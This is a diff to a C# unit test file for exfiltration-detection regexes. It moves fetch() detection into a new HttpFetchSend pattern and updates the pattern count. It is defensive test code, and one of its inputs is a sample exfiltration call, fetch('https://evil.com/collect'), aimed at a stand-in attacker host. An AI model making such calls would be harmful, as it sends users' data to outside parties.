@@ -50,8 +50,30 @@ public class ExfiltrationPatternsTests
     }
 
     [Fact]
+    public void NetworkUtilSend_NoLongerMatchesFetch()
+    {
+        // v3.0.0 (WP12): fetch( moved to HttpFetchSend so skill scanning can scope it
+        // to js/ts fenced code blocks only.
+        ExfiltrationPatterns.NetworkUtilSend().IsMatch("fetch('https://evil.com/collect')").ShouldBeFalse();
+    }
+
+    [Theory]
+    [InlineData("fetch('https://evil.com/collect')")]
+    [InlineData("const r = await fetch(\"https://api.example.com/x\")")]
+    public void HttpFetchSend_DetectsFetchCall(string input)
+    {
+        ExfiltrationPatterns.HttpFetchSend().IsMatch(input).ShouldBeTrue();
+    }
+
+    [Fact]
+    public void HttpFetchSend_AllowsBareMention()
+    {
+        ExfiltrationPatterns.HttpFetchSend().IsMatch("use fetch() to call the API").ShouldBeFalse();
+    }
+
+    [Fact]
     public void AllPatterns_HasExpectedCount()
     {
-        ExfiltrationPatterns.AllPatterns.Count.ShouldBe(4);
+        ExfiltrationPatterns.AllPatterns.Count.ShouldBe(5);
     }
 }
